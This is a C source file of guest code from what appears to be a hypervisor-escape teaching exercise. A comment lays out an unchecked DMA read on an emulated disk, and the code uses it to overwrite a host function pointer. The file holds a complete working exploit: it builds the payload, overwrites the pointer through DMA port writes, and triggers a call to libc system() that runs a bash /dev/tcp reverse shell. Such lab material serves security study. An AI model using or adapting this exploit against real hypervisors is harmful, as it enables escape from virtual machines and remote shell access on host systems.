extern void outb(unsigned short a, unsigned char b);
extern void outl(unsigned short a, unsigned int b);

// 0000000000001051 address of reverse shell inside guest mem
// 0000000001407000 B foo_ptr
// 0000000000407000 B guestmem


void print(const char *s)
{
	while (*s != '\0') {
		outb(0x60, *s);
		s++;
	}
}

unsigned long const system = 0x00007ffff7443000 + 0x000000000004f440; // address of system in libc
typedef int (*system_p)(const char *);
void revshell()
{

	system_p sys = (system_p)system;
	(*sys)("/bin/bash -c 'bash >& /dev/tcp/localhost/5000 <&1 &'");
}

/************************************************************************************************
 * 
 * 							  VULN & ATTACK PLAN
 * 
 *  The virtual machine can make use of an emulated hard disk. The HDD is 
 * 	capable of "DMA" operations. In the operation of DMA read, no control is put in
 * 	place in the address of the guestmem: the operation always copy 512 bytes
 * 	and there is the possibility to overwrite something beyond the guest memory, 
 * 	overwriting hypervisor's variables. In this example, foo pointer represents 
 * 	sensible pointers inside QEMU for instance. We can try to overwrite that pointer 
 * 	in order to let the hypervisor connect to another machine controlled by us, 
 * 	using a reverse shell. In this first variant of the exercise the hypervisor set the 
 * 	pages containing the guest memory as executable using mprotect(), just to make the
 * 	attack easier for learning purposes. We then increment the difficulty step by step.
 * 
 * 
************************************************************************************************/

char payload[512];
char *copyback_buffer;

int main()
{
	unsigned long const KiB = 1024UL;
	unsigned long const MiB = 1024*KiB;
	unsigned long const GUESTMEMSZ = 16*MiB;
	unsigned long rev_shell_guest = 0x104c; 
	unsigned long foo_ptr_host 	= 	0x1407000;
	unsigned long guestmem_host = 	0x0407000;

	/* We want to build the payload in guest mem, then copy it to disk, 
	and then copy it back to guest mem, overwriting foo_ptr.
	In the hypervisor, foo_ptr is right after the the space reserved
	to the guest memory. Since we have to overwrite just 8 bytes and
	the DMA read will copy 512 bytes, the address inside the guest where
	we ask to copy data is: GUESTMEMSZ - 512 + 8. Be sure that the address
	is inside a buffer you control. I think that we are lucky 'cause it's
	going to be saved on the stack and the stack is at the end of the 
	reservede memory, making it easier to write outside. */
	
	copyback_buffer = (char *)GUESTMEMSZ - 512 + 8;

	char *p = payload;
	for(int i = 0; i < 512 - 8; i++)
		*(p + i) = 'A';
	
	*(unsigned long *)(p + 512 - 8) = (unsigned long)(guestmem_host + rev_shell_guest);

/*
	HDD interface
	unsigned int snr;	// 0x40, sector number
	unsigned int mem;	// 0x44, guest memory address
	unsigned int cmd;	// 0x48, 1: DMA-in, 2: DMA-out
*/

	// write payload
	outl(0x40, 50); 
	outl(0x44, (unsigned int) payload);
	outl(0x48, 2);

	// copy back, overwriting foo pointer
	outl(0x40, 50);
	outl(0x44, (unsigned int) copyback_buffer);
	outl(0x48, 1);

	// trigger foo_pointer call
	outl(0x70, 1);

}
